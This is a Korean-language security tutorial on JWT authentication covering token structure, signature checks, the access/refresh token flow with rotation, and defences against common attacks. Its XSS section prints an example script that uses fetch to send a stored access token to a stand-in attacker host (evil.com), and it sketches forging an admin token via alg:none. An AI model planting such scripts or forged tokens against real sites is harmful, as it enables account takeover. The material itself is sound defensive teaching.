JWT

구조 해부부터 서명 검증 원리, XSS·탈취·alg:none 공격 대응, Access/Refresh Token Rotation 전략까지

Section 01
JWT 구조 해부
JWT는 점(.)으로 구분된 3개의 Base64URL 인코딩 문자열입니다. 암호화가 아닌 서명(Signature)으로 위변조를 방지합니다.
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsImVtYWlsIjoia2lsaWFuQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwMDM2MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
① Header
{ "alg": "HS256", "typ": "JWT" }
서명 알고리즘과 토큰 타입을 명시합니다.
alg 값은 서버에서 반드시 화이트리스트 검증 필요
② Payload (Claims)
{ "sub": "42", "email": "kilian@..", "role": "admin", "iat": 1700000000, "exp": 1700003600 }
Base64 디코딩으로 누구나 열람 가능
비밀번호, 민감 정보 절대 저장 금지
③ Signature
HMAC_SHA256( base64url(header) + "." + base64url(payload), SECRET_KEY )
서버만 아는 비밀키로 생성한 서명
Payload 1글자라도 바뀌면 서명 불일치
Registered Claims (표준 필드)
sub
주체 (사용자 ID)
iss
발급자 (서버 URL)
aud
대상 (수신자)
exp
만료 시간 (Unix)
iat
발급 시간 (Unix)
nbf
활성 시작 시간
jti
JWT 고유 ID
Section 02
서명 검증 원리
서버가 토큰을 어떻게 신뢰하는가 — 저장소 조회 없이 수학적으로 위변조를 탐지합니다.
서버의 JWT 검증 과정
클라이언트가 보낸 토큰
eyJhbGci...헤더.eyJzdWIi...페이로드.SflKxw...서명
① 헤더에서 알고리즘 추출
② 페이로드에서 exp 확인 (만료 검사)
⟵ 비교 ⟶
서버가 재계산한 서명
HMAC_SHA256( 헤더 + "." + 페이로드, SECRET_KEY ) = SflKxw...?
③ 서버 비밀키로 서명 재계산
④ 클라이언트 서명과 일치 여부 확인
✓ 서명 일치 + 만료 안됨
Payload에서 사용자 정보 추출 → 요청 처리
✗ 서명 불일치 or 만료
401 Unauthorized 반환 → 재로그인 또는 Refresh
Section 03
전체 동작 흐름
로그인부터 토큰 갱신, 로그아웃까지 JWT 기반 인증의 전체 사이클
1
로그인 요청
클라이언트가 ID/PW를 서버로 전송합니다.
POST /auth/login Content-Type: application/json { "email": "kilian@example.com", "password": "***" }
2
서버 — 토큰 발급
인증 성공 시 AccessToken(짧은 만료)과 RefreshToken(긴 만료)을 발급합니다. 서버에는 아무것도 저장하지 않습니다.
# AccessToken — 짧은 만료 (5~15분) accessToken = sign({sub:42, role:"admin", exp: now+900}, SECRET) # RefreshToken — 긴 만료 (7~30일) refreshToken = sign({sub:42, jti:"uuid-1234", exp: now+604800}, SECRET) HTTP/1.1 200 OK # AccessToken → Response Body { "accessToken": "eyJ..." } # RefreshToken → HttpOnly 쿠키 Set-Cookie: refreshToken=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
3
클라이언트 — 토큰 저장
AccessToken은 JS 메모리(변수/상태)에만 저장합니다. localStorage는 XSS에 취약해서 사용하지 않습니다.
# ✅ AccessToken → 메모리 (React state, 전역변수) const [accessToken, setAccessToken] = useState("eyJ...") # ✅ RefreshToken → 서버가 HttpOnly 쿠키로 자동 저장 # (JS에서 접근 불가, 브라우저가 관리) # ❌ 절대 금지 localStorage.setItem("accessToken", "eyJ...")
4
API 요청 — Bearer 토큰 전송
요청마다 메모리의 AccessToken을 Authorization 헤더에 수동으로 첨부합니다. 서버는 DB 조회 없이 서명만 검증합니다.
GET /api/my-data Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.xxx # 서버 처리 (DB 조회 없음) ① 서명 검증 → ② exp 확인 → ③ payload에서 userId 추출 → ④ 응답
5
AccessToken 만료 → Silent Refresh
401 응답을 받으면 클라이언트가 자동으로 RefreshToken으로 새 AccessToken을 재발급받고 원래 요청을 재시도합니다.
# 1. API 요청 → 401 (AccessToken 만료) GET /api/my-data → 401 Unauthorized # 2. RefreshToken으로 재발급 요청 # (HttpOnly 쿠키라 자동으로 전송됨) POST /auth/refresh Cookie: refreshToken=eyJ... ← 브라우저 자동 첨부 # 3. 서버 응답 { "accessToken": "eyJ...새토큰" } ← 메모리 업데이트 Set-Cookie: refreshToken=eyJ...새리프레시 ← Rotation # 4. 원래 요청 재시도 GET /api/my-data → 200 OK
6
앱 시작 시 — Silent Refresh
새로고침 시 메모리가 초기화되므로, 앱 로드 직후 RefreshToken 쿠키로 AccessToken을 복구합니다.
# 앱 초기화 시 (useEffect, main.js 등) async function initAuth() { try { # RefreshToken 쿠키 자동 전송 const { accessToken } = await POST("/auth/refresh") setAccessToken(accessToken) # 메모리 복원 } catch { # RefreshToken도 만료 → 로그인 페이지 redirect("/login") } }
Section 04
보안 이슈와 해결 방법
JWT를 사용할 때 발생하는 4가지 핵심 보안 위협과 각 대응 전략
🔓

토큰 탈취 — XSS (Cross-Site Scripting)

악성 스크립트를 페이지에 주입해 JS로 토큰을 훔치는 공격. localStorage에 저장된 토큰은 단 한 줄의 코드로 탈취됩니다.

공격 시나리오
# 공격자가 게시판 댓글에 삽입한 스크립트 <script> # localStorage에 토큰이 있으면 즉시 탈취 fetch('https://evil.com/steal?t=' + localStorage.getItem('accessToken')) </script> # 피해자가 페이지를 보는 순간 토큰 전송됨 # 공격자는 탈취한 토큰으로 API 자유 호출
방어 전략
AccessToken을 메모리(JS 변수)에만 저장 — localStorage/sessionStorage 금지
RefreshToken은 HttpOnly 쿠키에 저장 — JS 접근 원천 차단
Content-Security-Policy 헤더로 외부 스크립트 실행 제한
사용자 입력값 HTML 이스케이프 처리 (DOMPurify 등)
AccessToken 만료를 짧게 — 탈취돼도 피해 시간 최소화
🔄

즉시 로그아웃 불가 — Stateless의 딜레마

JWT는 서버에 저장되지 않아 발급된 토큰을 취소할 방법이 없습니다. 강제 로그아웃, 권한 박탈, 탈취 대응이 즉시 불가합니다.

문제 상황
# 시나리오: 관리자 권한 즉시 박탈 DB에서 role = "user"로 변경 → 반영 안됨 기존 JWT에는 role: "admin" 그대로 존재 → 만료될 때까지 관리자 API 접근 가능 # 시나리오: 토큰 탈취 감지 후 차단 보안팀이 userId=42 강제 로그아웃 실행 → 서버에 저장된 게 없어서 차단 불가 → 남은 만료 시간 동안 공격자 활동 가능
방어 전략
AccessToken 만료를 5~15분으로 짧게 — 탈취 피해 시간 제한
블랙리스트 DB 운용 — 무효화할 jti를 Redis에 저장하고 요청마다 조회 (Stateful이 됨)
Token Version 패턴 — DB에 tokenVersion 컬럼 추가, 로그아웃 시 버전 증가, JWT의 버전과 비교
완전한 즉시 무효화가 필요하면 세션 방식이 더 적합할 수 있음
🎭

alg:none 공격 — 서명 우회

Header의 alg 값을 "none"으로 변조하면, 서명 검증을 건너뛰는 취약한 서버에서 위조 토큰이 그대로 통과됩니다.

공격 시나리오
# 1. 정상 토큰 발급받음 { alg: "HS256" }.{ role: "user" }.서명 # 2. 공격자가 Header/Payload를 직접 조작 { alg: "none" }.{ role: "admin" }.(서명 없음) # 3. 취약한 서버의 처리 alg가 none이니 서명 검증 스킵... → 위조된 admin 토큰이 통과!
방어 전략
서버에서 허용 알고리즘 화이트리스트 명시 — alg를 토큰에서 읽지 말고 서버에 고정
alg: none 및 빈 서명 명시적 거부
최신 버전의 검증된 JWT 라이브러리 사용 (직접 파싱 금지)
# ✅ 올바른 서버 검증 (예: Node.js) jwt.verify(token, SECRET, { algorithms: ['HS256'] ← 허용 알고리즘 고정 })
🔑

약한 Secret Key — 브루트포스 위조

HS256은 대칭키 알고리즘이라 비밀키가 짧거나 단순하면 오프라인 브루트포스 공격으로 서명을 위조할 수 있습니다.

공격 시나리오
# 약한 비밀키 사용 예시 SECRET = "secret" ← 즉시 크랙 가능 SECRET = "password123" ← 딕셔너리 공격 SECRET = "jwt_secret" ← 흔한 패턴 # JWT는 탈취 후 오프라인에서 크랙 가능 # 비밀키 알아내면 임의 토큰 무한 생성 가능
방어 전략
256비트(32바이트) 이상의 랜덤 비밀키 사용
비밀키를 환경변수로 관리 — 코드에 하드코딩 절대 금지
RS256(비대칭키) 고려 — 서명은 개인키, 검증은 공개키로 분리
# ✅ 안전한 비밀키 생성 (Node.js) require('crypto').randomBytes(64).toString('hex') # → 128자리 hex 문자열, 512비트 엔트로피 # .env JWT_SECRET=a3f8c2e1b4d7...128자리 랜덤값
Section 05
Access / Refresh Token 전략 — Rotation
짧은 AccessToken + HttpOnly 쿠키의 RefreshToken 조합으로 보안과 사용성을 동시에 잡는 실전 전략
⚡ AccessToken
만료 시간5 ~ 15분
저장 위치JS 메모리
전달 방법Authorization 헤더
서버 저장불필요
탈취 피해만료까지만 유효 (최대 15분)
🔐 RefreshToken
만료 시간7 ~ 30일
저장 위치HttpOnly 쿠키
전달 방법쿠키 자동 전송
서버 저장DB/Redis에 저장 권장
사용 목적AccessToken 재발급 전용
Refresh Token Rotation 흐름
1
AccessToken 만료 → 클라이언트가 POST /auth/refresh 요청
RefreshToken 쿠키가 자동으로 전송됨
2
서버: 기존 RefreshToken 즉시 무효화 (DB에서 삭제)
사용된 토큰은 재사용 불가 처리
3
새 AccessToken + 새 RefreshToken 동시 발급
새 RefreshToken을 HttpOnly 쿠키로 Set-Cookie
!
이미 무효화된 RefreshToken으로 재요청이 오면?
토큰이 탈취된 것으로 판단 → 해당 사용자 전체 세션 강제 로그아웃
Section 06
서명 알고리즘 — HS256 vs RS256
단일 서버면 HS256, 여러 서비스가 토큰을 검증해야 한다면 RS256
HS256
대칭키 알고리즘
서명과 검증에 동일한 비밀키 사용
# 서명 (발급 서버) sign(payload, SECRET_KEY) # 검증 (같은 SECRET_KEY 필요) verify(token, SECRET_KEY)
구현 단순, 성능 빠름
단일 서버 환경에 적합
△ 검증 서버도 비밀키 공유 필요 → 키 노출 시 전체 위험
RS256
비대칭키 알고리즘
서명은 개인키, 검증은 공개키로 분리
# 서명 (Auth 서버만 보유) sign(payload, PRIVATE_KEY) # 검증 (공개키는 누구나 가져도 됨) verify(token, PUBLIC_KEY)
Auth 서버만 서명 가능, 다른 서비스는 공개키로 검증만
MSA / 여러 도메인 간 토큰 공유에 적합
공개키 노출돼도 서명 위조 불가
Section 07
JWT 보안 체크리스트
프로덕션 배포 전 반드시 확인해야 할 항목들
✅
AccessToken은 JS 메모리에만 저장 — localStorage/sessionStorage 금지
✅
RefreshToken은 HttpOnly + Secure + SameSite=Strict 쿠키에 저장
✅
RefreshToken 쿠키에 Path=/auth/refresh 설정 — 불필요한 요청에 전송 방지
✅
AccessToken 만료를 5~15분으로 짧게 설정
✅
서버에서 허용 알고리즘 화이트리스트 설정 — alg:none 차단
✅
비밀키는 256비트 이상 랜덤값으로 환경변수 관리
✅
Refresh Token Rotation 적용 — 재사용 감지 시 전체 로그아웃
✅
Payload에 민감 정보(비밀번호 등) 저장 금지 — Base64 디코딩 가능
✅
모든 통신 HTTPS 강제 — HTTP 요청 시 쿠키 전송 차단
✅
앱 시작 시 Silent Refresh로 AccessToken 복구 처리
